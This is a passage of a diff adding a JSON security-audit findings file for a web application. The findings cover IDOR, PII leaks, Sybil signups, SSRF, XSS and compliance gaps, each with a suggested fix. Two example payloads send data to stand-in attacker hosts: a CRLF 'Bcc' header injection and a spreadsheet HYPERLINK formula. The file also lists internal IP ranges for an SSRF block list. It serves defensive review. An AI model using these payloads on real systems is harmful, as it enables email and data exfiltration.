+      "title": "NotificationDeletion lacks ownership check (IDOR \u2014 read/modify others' notifications)",
+      "severity": "Medium",
+      "cwe": "CWE-639",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/api/notifications/*"
+      ],
+      "categories": [
+        "Cat 4"
+      ],
+      "location": {
+        "file": "app/api/notifications/[id]/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "DELETE/PATCH on /api/notifications/[id] does not verify notification.userEmail === session.user.email before mutating. An attacker can read/delete other users' notifications by ID enumeration.",
+      "business_impact": "Cross-user notification tampering; leak of notification content to unintended actors.",
+      "remediation": "Add explicit ownership filter on every mutation: where: { id, userEmail: session.user.email }.",
+      "owasp": "A01:2021"
+    },
+    {
+      "id": "F-050",
+      "title": "Wallet history accessible by enumerable user email (indirect IDOR on financial data)",
+      "severity": "Medium",
+      "cwe": "CWE-639",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/api/wallet/*"
+      ],
+      "categories": [
+        "Cat 4"
+      ],
+      "location": {
+        "file": "app/api/wallet/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Wallet history endpoint accepts userEmail query param without verifying it matches the session. A user can request another user's transaction history by guessing the email.",
+      "business_impact": "Cross-user financial-data leak; enables targeted enumeration of high-value accounts.",
+      "remediation": "Drop the userEmail param; always derive from session.user.email. CORE-only override gated behind explicit permission + audit log.",
+      "owasp": "A01:2021"
+    },
+    {
+      "id": "F-051",
+      "title": "Notification-message content unfiltered when returned via GET (PII echo)",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/api/notifications/*"
+      ],
+      "categories": [
+        "Cat 6"
+      ],
+      "location": {
+        "file": "app/api/notifications/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Notification messages may contain PII (other users' names, emails, addresses) and are returned without sanitization.",
+      "business_impact": "PII echo to recipients beyond intended scope; data-minimization violation.",
+      "remediation": "Filter sensitive fields out of notification payloads; reference IDs instead of raw text."
+    },
+    {
+      "id": "F-052",
+      "title": "AuditLog metadata JSON contains unredacted PII; visible to all CORE",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "all CORE"
+      ],
+      "affected_panels": [
+        "/core/audit-log"
+      ],
+      "categories": [
+        "Cat 6",
+        "Cat 25"
+      ],
+      "location": {
+        "file": "lib/audit.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "logAudit({ metadata: { /* anything */ } }) writes arbitrary objects to AuditLog.metadata. Callers often pass full request bodies (with PII). All CORE users can then read this PII via the audit-log UI.",
+      "business_impact": "Insider PII exposure; data-minimization violation; chain with F-048 widens insider visibility.",
+      "remediation": "Document a strict schema for metadata; redact email/phone/SSN-like patterns at write time; filter on read for non-audit:FULL_ACCESS callers."
+    },
+    {
+      "id": "F-053",
+      "title": "Soft-delete filtering inconsistent across queries (deleted records sometimes visible)",
+      "severity": "Medium",
+      "cwe": "CWE-285",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "multiple list views"
+      ],
+      "categories": [
+        "Cat 6",
+        "Cat 23"
+      ],
+      "location": {
+        "file": "Multiple prisma.*.findMany callsites",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "6+ callsites do not filter deletedAt: null; deleted records leak into list views.",
+      "business_impact": "Deleted/offboarded data appears in admin views; trust + compliance gap.",
+      "remediation": "Add a Prisma extension (middleware) that injects deletedAt: null by default for all soft-delete-bearing models; require explicit includeDeleted: true opt-in."
+    },
+    {
+      "id": "F-054",
+      "title": "PublicUser.signupIp returned in admin API responses (internal PII leak)",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "all admins reading public-users"
+      ],
+      "affected_panels": [
+        "/core/admin/public-users"
+      ],
+      "categories": [
+        "Cat 6",
+        "Cat 13"
+      ],
+      "location": {
+        "file": "app/api/admin/public-users/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Internal-use field signupIp is included in admin JSON. Should remain server-internal.",
+      "business_impact": "PII leak; chain with F-016 widens enumeration potential.",
+      "remediation": "Strip signupIp from the API select; expose only on a dedicated audit-trail view."
+    },
+    {
+      "id": "F-055",
+      "title": "PersonalVault model exists but is unused; PII still stored plaintext in PublicUser/Member",
+      "severity": "Medium",
+      "cwe": "CWE-312",
+      "affected_roles": [
+        "all data subjects"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 6",
+        "Cat 13",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "A PersonalVault Prisma model exists (intended for encrypted PII), but no code reads/writes to it. PII (phone, address, school) is stored plaintext on the user model.",
+      "business_impact": "Cleartext storage of sensitive info; DB-dump risk; compliance gap.",
+      "remediation": "Implement the vault: encrypt PII at rest using lib/encryptedSession.ts (post-F-006 fix); migrate existing rows; restrict decryption to authenticated owner + audit-logged admin reads."
+    },
+    {
+      "id": "F-056",
+      "title": "Account merge / signup callback prefers higher role on collision (escalation by data inconsistency)",
+      "severity": "Medium",
+      "cwe": "CWE-269",
+      "affected_roles": [
+        "users present in both Member and CommunityMember"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 3"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 13,
+        "line_end": 86,
+        "function": "signIn callback"
+      },
+      "description": "If a user exists in both Member and CommunityMember (data inconsistency), the signIn callback resolves to CORE (the higher role). No application-level invariant enforces mutual exclusion.",
+      "business_impact": "Privilege escalation via data inconsistency; no explicit collision detection.",
+      "remediation": "Enforce uniqueness across the three user tables via a unique partial index on email; on collision, reject signin and require manual reconciliation."
+    },
+    {
+      "id": "F-057",
+      "title": "Multi-device session: role/permission downgrade does not invalidate other devices' JWTs",
+      "severity": "Medium",
+      "cwe": "CWE-613",
+      "affected_roles": [
+        "any multi-device user"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 1",
+        "Cat 3"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Same root cause as F-004; tracked separately for the multi-device dimension. Even after F-004 remediation lands (tokenVersion), tokenVersion is per-user-not-per-device, so any change invalidates all devices.",
+      "business_impact": "Downgrade not propagated to all devices until explicit logout-all is implemented.",
+      "remediation": "Add a 'Sessions' admin UI listing active devices and allowing per-device revoke (requires session table per F-004 remediation #4)."
+    },
+    {
+      "id": "F-058",
+      "title": "Email lookup uses mode: 'insensitive' but does not normalize Unicode NFC",
+      "severity": "Medium",
+      "cwe": "CWE-176",
+      "affected_roles": [
+        "users registering with non-ASCII emails"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 22",
+        "Cat 28",
+        "Cat 29"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 13,
+        "line_end": 86,
+        "function": null
+      },
+      "description": "Two visually identical emails using different Unicode normalization forms (NFC vs NFD) compare unequal in PostgreSQL. Combined with F-059 alias permissiveness, an attacker can register multiple accounts.",
+      "business_impact": "Account-uniqueness bypass; Sybil door for non-ASCII emails.",
+      "remediation": "Normalize all emails to NFC + lowercase + alias-strip before storing AND querying."
+    },
+    {
+      "id": "F-059",
+      "title": "Email aliasing (john+1@gmail.com \u2261 john@gmail.com) not normalized \u2014 Sybil door",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "any signup"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Gmail's +suffix and . aliasing means john.smith+1@gmail.com, johnsmith@gmail.com, j.o.h.n.s.m.i.t.h@gmail.com are the same inbox but distinct database rows. Enables Sybil farming.",
+      "business_impact": "Multi-account signup farming; chain with F-104 enables economy abuse.",
+      "remediation": "Normalize Gmail-style aliases (strip +suffix, strip . from local-part) before unique-checks. Use a third-party normalization library to handle other providers."
+    },
+    {
+      "id": "F-060",
+      "title": "Disposable email domains (mailinator, etc.) not filtered on signup",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "any signup"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "mailinator/guerrilla/tempmail domains are accepted at signup. Enables account farming for points/swag/bounty fraud.",
+      "business_impact": "Sybil farming; bounty/swag abuse.",
+      "remediation": "Maintain a blocklist of disposable domains (use disposable-email-domains npm package); reject signups matching."
+    },
+    {
+      "id": "F-061",
+      "title": "No CAPTCHA on signup or any high-risk action",
+      "severity": "Medium",
+      "cwe": "CWE-799",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "/api/auth/",
+        "/swag",
+        "/contact"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/auth/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "No CAPTCHA on signup, swag redeem, contact form. Bot farming is line-rate.",
+      "business_impact": "Bot abuse at line rate; signup farming; spam.",
+      "remediation": "Integrate hCaptcha or Cloudflare Turnstile on signup, swag redeem, contact form, public submissions."
+    },
+    {
+      "id": "F-062",
+      "title": "No phone verification \u2014 VoIP / disposable numbers reused undetected",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "users supplying phone"
+      ],
+      "affected_panels": [
+        "speedrun signups"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "no phone-verification module"
+      },
+      "description": "No SMS/voice verification on signup; phone numbers (where collected, e.g., Speedrun) are unverified strings.",
+      "business_impact": "Phone-uniqueness bypass; disposable-number Sybil door.",
+      "remediation": "Optional phone-OTP for high-risk actions; mandatory for Bounty.cash withdrawals."
+    },
+    {
+      "id": "F-063",
+      "title": "No device fingerprinting; any client-supplied device-id accepted",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "all PWA users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": "middleware.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "If any flow trusts device-id from the client (some PWA flows do), the attacker rotates IDs to bypass per-device limits.",
+      "business_impact": "Per-device controls trivially bypassed.",
+      "remediation": "Use server-derived stable fingerprint (FingerprintJS Pro or homegrown UA+IP hash) for analytics/abuse signals; never trust client IDs for security gates."
+    },
+    {
+      "id": "F-064",
+      "title": "No IP reputation / Tor / VPN detection on auth or sensitive endpoints",
+      "severity": "Medium",
+      "cwe": "CWE-940",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": "middleware.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "No geolocation, ASN, or known-bad-IP filtering on auth/signup.",
+      "business_impact": "Adversaries hide behind Tor/VPN trivially; abuse undetected.",
+      "remediation": "Integrate IPQualityScore or similar; flag Tor exits and known VPN ranges for additional friction (CAPTCHA challenge, no high-value actions)."
+    },
+    {
+      "id": "F-065",
+      "title": "Swag redemption has no per-user/day velocity gate (drain points in seconds)",
+      "severity": "Medium",
+      "cwe": "CWE-799",
+      "affected_roles": [
+        "any user"
+      ],
+      "affected_panels": [
+        "/swag"
+      ],
+      "categories": [
+        "Cat 21",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/swag/[id]/redeem/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "User can redeem unlimited swag per day.",
+      "business_impact": "Inventory drain in seconds; legitimate users blocked.",
+      "remediation": "Cap at 3 redemptions per user per 24h."
+    },
+    {
+      "id": "F-066",
+      "title": "No redemption / withdrawal risk scoring (anti-abuse layer absent)",
+      "severity": "Medium",
+      "cwe": "CWE-754",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "/swag",
+        "/bounty/cash withdraw"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/swag/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "No risk model evaluating redemption requests (new account, high-value, suspicious shipping address).",
+      "business_impact": "Fraudulent redemptions; chargebacks; shipment to fraudster addresses.",
+      "remediation": "Build a simple risk score combining account-age, points-velocity, address-fraud-checks; flag scores > threshold for manual review."
+    },
+    {
+      "id": "F-067",
+      "title": "Admin login has no impossible-travel detection",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all admins"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 22",
+        "Cat 25"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Two admin signins from geo-distant IPs within 1 hour are not flagged.",
+      "business_impact": "Compromised admin credential abuse goes undetected.",
+      "remediation": "Store last signin geo; compute Haversine on next signin; require step-up auth if > 1000 km in < 1h."
+    },
+    {
+      "id": "F-068",
+      "title": "No anomaly detection on balance-earning patterns",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "wallet"
+      ],
+      "categories": [
+        "Cat 22",
+        "Cat 25"
+      ],
+      "location": {
+        "file": "lib/wallet.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "No baseline of normal earning velocity; sudden 10\u00d7spike per user is undetected.",
+      "business_impact": "Point-farming via F-005/F-009 chain runs invisible; reconciliation only after damage done.",
+      "remediation": "Daily job computing per-user WalletTransaction velocity; alert > 3\u03c3 above 30-day baseline."
+    },
+    {
+      "id": "F-069",
+      "title": "Email captured but not verified in Speedrun registration (impersonation)",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "any registrant"
+      ],
+      "affected_panels": [
+        "/speedrun"
+      ],
+      "categories": [
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/speedrun/runs/[slug]/register/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "A registration can specify any email address (not necessarily the session email \u2014 the form takes a free-text 'team captain email'). Could be used to impersonate / spam.",
+      "business_impact": "Impersonation / spam vector; communications sent to unverified addresses.",
+      "remediation": "Require an email-confirmation step before the registration is finalized (send a verify link)."
+    },
+    {
+      "id": "F-070",
+      "title": "Custom email body SSTI / template injection in admin custom-approval template",
+      "severity": "Medium",
+      "cwe": "CWE-94",
+      "affected_roles": [
+        "CORE admins using custom templates"
+      ],
+      "affected_panels": [
+        "/core/applications"
+      ],
+      "categories": [
+        "Cat 14"
+      ],
+      "location": {
+        "file": "lib/email.ts",
+        "line_start": 199,
+        "line_end": 249,
+        "function": "getCustomApprovalEmailTemplate"
+      },
+      "description": "The getCustomApprovalEmailTemplate function takes admin-supplied template strings and substitutes {{var}} values. If template syntax is permissive (e.g., supports expressions), CORE-supplied templates could execute server-side.",
+      "business_impact": "Server-side template injection by malicious admin (low risk because CORE-only, but worth hardening).",
+      "remediation": "Use a restricted template engine (Handlebars with no helpers, or simple {{var}} regex replacement only) \u2014 no expression evaluation."
+    },
+    {
+      "id": "F-071",
+      "title": "CRLF header injection via contact form (admin email broadcast and contact endpoint)",
+      "severity": "Medium",
+      "cwe": "CWE-93",
+      "affected_roles": [
+        "anonymous (contact form)",
+        "any CORE"
+      ],
+      "affected_panels": [
+        "/api/public/contact",
+        "/api/event-feedback"
+      ],
+      "categories": [
+        "Cat 14"
+      ],
+      "location": {
+        "file": "app/api/public/contact/route.ts",
+        "line_start": 20,
+        "line_end": 41,
+        "function": null
+      },
+      "description": "User-supplied subject/from-name fields are interpolated into email headers without CRLF stripping. Depending on nodemailer version, an attacker injecting \\r\\nBcc: leak@evil.com could exfiltrate.",
+      "business_impact": "Email exfiltration via injected Bcc; spoofing / phishing fan-out.",
+      "remediation": "Strip \\r\\n from any user input destined for headers; use the SMTP library's named parameters rather than string concat."
+    },
+    {
+      "id": "F-072",
+      "title": "HMAC search index re-uses encryption key (key-mixing weakness)",
+      "severity": "Medium",
+      "cwe": "CWE-326",
+      "affected_roles": [
+        "all encryptedSession users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 20"
+      ],
+      "location": {
+        "file": "lib/encryptedSession.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "The blind-index HMAC for searchable encrypted columns uses the same key as AES-GCM encryption. Key reuse across primitives is a hygiene violation; a flaw in either reduces security of the other.",
+      "business_impact": "Cryptographic hygiene weakness; widens blast radius of any single-primitive flaw.",
+      "remediation": "Derive distinct sub-keys via HKDF: encKey = HKDF(masterKey, 'encryption'), macKey = HKDF(masterKey, 'search-index')."
+    },
+    {
+      "id": "F-073",
+      "title": "Referral code entropy weak \u2014 Math.random() (predictable, non-CSPRNG)",
+      "severity": "Medium",
+      "cwe": "CWE-338",
+      "affected_roles": [
+        "all speedrun captains"
+      ],
+      "affected_panels": [
+        "/speedrun"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 20",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "lib/speedrun.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Speedrun referral codes are generated with Math.random(), which is non-CSPRNG. Codes are predictable from preceding codes. Attackers can enumerate active codes to attribute conversions.",
+      "business_impact": "Referral attribution fraud; conversion-counter inflation.",
+      "remediation": "Replace with crypto.randomBytes(8).toString('base32') or nanoid(10)."
+    },
+    {
+      "id": "F-074",
+      "title": "Avatar fetch endpoint forwards Twitter handle to unavatar.io without validation (limited SSRF)",
+      "severity": "Medium",
+      "cwe": "CWE-918",
+      "affected_roles": [
+        "any user"
+      ],
+      "affected_panels": [
+        "/api/avatar"
+      ],
+      "categories": [
+        "Cat 18"
+      ],
+      "location": {
+        "file": "app/api/avatar/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Endpoint takes ?handle= and proxies to https://unavatar.io/twitter/${handle} without validating handle format. Limited SSRF (can only target unavatar.io subpaths, not arbitrary URLs), but path-traversal in handle could redirect.",
+      "business_impact": "Limited SSRF; path-traversal attempt vectors.",
+      "remediation": "Validate handle as [a-zA-Z0-9_]{1,15} before interpolation."
+    },
+    {
+      "id": "F-075",
+      "title": "Luma event data validation incomplete; admin view of Luma event titles renders without sanitization",
+      "severity": "Medium",
+      "cwe": "CWE-79",
+      "affected_roles": [
+        "all admins viewing events"
+      ],
+      "affected_panels": [
+        "/core/events"
+      ],
+      "categories": [
+        "Cat 18",
+        "Cat 24"
+      ],
+      "location": {
+        "file": "lib/luma.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Event data fetched from Luma API is rendered in admin views (titles, descriptions). Combined with F-008 CSP, a malicious Luma event title could XSS admins.",
+      "business_impact": "Stored XSS via third-party data; admin compromise.",
+      "remediation": "Sanitize all third-party data via DOMPurify before render; enforce a strict event-title schema (\u2264 200 chars, no HTML)."
+    },
+    {
+      "id": "F-076",
+      "title": "Vercel Blob upload token grants unrestricted path-write access",
+      "severity": "Medium",
+      "cwe": "CWE-285",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/api/upload/token"
+      ],
+      "categories": [
+        "Cat 19",
+        "Cat 24"
+      ],
+      "location": {
+        "file": "app/api/upload/token/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "The Blob upload token returned to clients does not restrict the upload pathname \u2014 an authenticated user can overwrite any other user's blob path.",
+      "business_impact": "Cross-user blob overwrite; possible content tampering for victims.",
+      "remediation": "Use Vercel Blob's addRandomSuffix: true and pathname allowlist (e.g., scope to users/${userId}/uploads/)."
+    },
+    {
+      "id": "F-077",
+      "title": "Cloudinary signed upload params accept arbitrary folder parameter",
+      "severity": "Medium",
+      "cwe": "CWE-639",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/api/upload/cloudinary"
+      ],
+      "categories": [
+        "Cat 19",
+        "Cat 24"
+      ],
+      "location": {
+        "file": "app/api/upload/cloudinary/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Signed upload params lock eager/format but not folder \u2014 client can write into any folder. Combined with admin-side selectors that list folders, an attacker can place attacker-controlled images into another user's folder.",
+      "business_impact": "Cross-folder image planting; attacker content surfaces in victim contexts.",
+      "remediation": "Server-side derive folder from session; sign it; reject client-supplied folder param."
+    },
+    {
+      "id": "F-078",
+      "title": "Formula injection in Speedrun registrations CSV export (=, +, -, @, TAB)",
+      "severity": "Medium",
+      "cwe": "CWE-1236",
+      "affected_roles": [
+        "CORE downloading export"
+      ],
+      "affected_panels": [
+        "/core/speedrun"
+      ],
+      "categories": [
+        "Cat 19"
+      ],
+      "location": {
+        "file": "app/api/speedrun/registrations/export/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Cells starting with =, +, -, @, or \\t are executed as formulas in Excel/Sheets. A malicious team-name like =HYPERLINK('http://evil/?p='&A1) exfiltrates other cells.",
+      "business_impact": "RCE on admin laptops opening export; data exfiltration via formulas.",
+      "remediation": "Prefix any cell starting with these characters with a single quote ('). Or wrap all cells in quotes."
+    },
+    {
+      "id": "F-079",
+      "title": "Media links[] array lacks URL allowlist validation",
+      "severity": "Medium",
+      "cwe": "CWE-601",
+      "affected_roles": [
+        "all members viewing media"
+      ],
+      "affected_panels": [
+        "/api/media"
+      ],
+      "categories": [
+        "Cat 19"
+      ],
+      "location": {
+        "file": "app/api/media/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Media items accept arbitrary URLs in their links array. Renders as clickable <a href> in member-facing UI. Combined with F-033 (XSS sinks), can be used for javascript: URLs or Open Redirect chains.",
+      "business_impact": "Open redirect; phishing chain; possible XSS via javascript: URLs.",
+      "remediation": "Validate URLs as https?:// only; reject javascript:, data:; consider domain allowlist for the most sensitive surfaces."
+    },
+    {
+      "id": "F-080",
+      "title": "OG-tag fetcher / preview not exploitable but lacks size cap; partial SSRF guard only",
+      "severity": "Medium",
+      "cwe": "CWE-918",
+      "affected_roles": [
+        "future feature"
+      ],
+      "affected_panels": [
+        "future"
+      ],
+      "categories": [
+        "Cat 18"
+      ],
+      "location": {
+        "file": "lib/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "If a link-preview / OG-tag fetcher is added in future, current scaffolding lacks SSRF guard (no IP-range blocklist for 169.254.169.254 / 127.0.0.0/8 / 10.0.0.0/8 / 172.16.0.0/12 / 192.168.0.0/16 / RFC-1918).",
+      "business_impact": "Future SSRF risk; metadata-server access if AWS/GCP later.",
+      "remediation": "Use a dedicated SSRF-safe HTTP client wrapper; resolve DNS + reject internal ranges before connect; cap response size."
+    },
+    {
+      "id": "F-081",
+      "title": "Google Calendar refresh token stored encrypted but in same DB column as access token (key colocation)",
+      "severity": "Medium",
+      "cwe": "CWE-312",
+      "affected_roles": [
+        "all calendar-integrated users"
+      ],
+      "affected_panels": [
+        "calendar integration"
+      ],
+      "categories": [
+        "Cat 24"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Both tokens encrypted at rest but co-located in same row, same encryption key. DB exfil = both compromised.",
+      "business_impact": "Single-key compromise = full Calendar token theft for all users.",
+      "remediation": "Separate KMS key for refresh tokens; consider hashicorp Vault / Vercel KMS integration."
+    },
+    {
+      "id": "F-082",
+      "title": "Luma API key trusted on poll without HMAC; poll endpoint returns raw Luma JSON",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "luma-integrated"
+      ],
+      "affected_panels": [
+        "events sync"
+      ],
+      "categories": [
+        "Cat 24"
+      ],
+      "location": {
+        "file": "lib/luma.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Outbound poll uses bearer token; inbound webhook (if any) would need to verify Luma's signature. Currently no inbound webhooks per recon, so risk is limited to the API-key being leaked from logs/Vercel-env.",
+      "business_impact": "Limited risk currently; preview-env exposure (F-014/F-045) widens it.",
+      "remediation": "Rotate Luma API key quarterly; restrict Luma org permissions to read-only."
+    },
+    {
+      "id": "F-083",
+      "title": "SMTP credentials in environment variables (no rotation, no per-env separation noted)",
+      "severity": "Medium",
+      "cwe": "CWE-798",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "email"
+      ],
+      "categories": [
+        "Cat 24"
+      ],
+      "location": {
+        "file": "lib/email.ts",
+        "line_start": 5,
+        "line_end": 10,
+        "function": null
+      },
+      "description": "SMTP_USER/SMTP_PASS in plain env. No documented rotation cadence; same credentials likely shared across all envs (per F-014 chain).",
+      "business_impact": "Cred reuse across envs; rotation discipline absent.",
+      "remediation": "Rotate quarterly; use a transactional-email provider with API-key + per-env keys (Resend, Postmark, SES with IAM roles)."
+    },
+    {
+      "id": "F-084",
+      "title": "Cron schedule modifications via PR are not gated / no second-party review on vercel.json",
+      "severity": "Medium",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "any committer"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 26"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "A PR modifying cron schedules merges with normal review; no required-reviewer rule for vercel.json. Combined with F-035 (drift), cron timing/auth could be silently weakened.",
+      "business_impact": "Silent cron-config weakening; no security gate on changes to critical infra files.",
+      "remediation": "Add CODEOWNERS requiring security-team review for vercel.json, next.config.ts, and prisma/schema.prisma changes."
+    },
+    {
+      "id": "F-085",
+      "title": "next-auth v4 approaching EOL; BlockNote pre-1.0 dependency risk",
+      "severity": "Medium",
+      "cwe": "CWE-1104",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 26"
+      ],
+      "location": {
+        "file": "package.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "next-auth@4 will be superseded by Auth.js v5; BlockNote is pre-1.0 with breaking-change risk.",
+      "business_impact": "Future maintenance debt; no patch path when EOL hits.",
+      "remediation": "Track in roadmap; pin to specific minor versions; schedule migration to next-auth v5 within 6 months."
+    },
+    {
+      "id": "F-086",
+      "title": "No /api/me/export endpoint \u2014 Right-of-Access (GDPR Art. 15 / DPDP \u00a711) unimplemented",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "all data subjects"
+      ],
+      "affected_panels": [
+        "/api/me/*"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "missing"
+      },
+      "description": "No user-facing 'download my data' endpoint. SAR responses must be assembled manually.",
+      "business_impact": "GDPR Art. 15 / DPDP \u00a711 non-compliance; manual SAR responses expensive and error-prone.",
+      "remediation": "Build /api/me/export returning a JSON dump of all user-PII rows across all tables. Include a digest for verification."
+    },
+    {
+      "id": "F-087",
+      "title": "No unsubscribe mechanism on emails; no special-category safeguards",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "all email recipients"
+      ],
+      "affected_panels": [
+        "email"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": "lib/email.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Outbound emails lack List-Unsubscribe header and an in-app preferences UI.",
+      "business_impact": "CAN-SPAM / GDPR Art. 7 compliance gap; deliverability and reputation impact.",
+      "remediation": "Add List-Unsubscribe: <mailto:unsubscribe@team1.io>, <https://app/unsubscribe?t=...> header; implement preferences page."
+    },
+    {
+      "id": "F-088",
+      "title": "Vercel Analytics loads pre-consent; no cookie-consent banner",
+      "severity": "Medium",
+      "cwe": "CWE-1295",
+      "affected_roles": [
+        "EU/UK visitors"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": "app/layout.tsx",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "<Analytics /> and <SpeedInsights /> load on first paint with no cookie-consent banner. EU/UK visitors are tracked without consent; ePrivacy Directive violation.",
+      "business_impact": "ePrivacy Directive violation; potential ICO/CNIL action.",
+      "remediation": "Implement cookie-consent banner; defer analytics scripts until consent."
+    },
+    {
+      "id": "F-089",
+      "title": "No grievance officer / DPO endpoint (DPDP \u00a710)",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "all data subjects"
+      ],
+      "affected_panels": [
+        "public"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "missing"
+      },
+      "description": "DPDP requires publishing contact for a Grievance Officer. No /contact-dpo or similar endpoint.",
+      "business_impact": "DPDP \u00a710 non-compliance.",
+      "remediation": "Publish contact in privacy policy; build a tracked grievance-submission endpoint with SLA."
+    },
+    {
+      "id": "F-090",
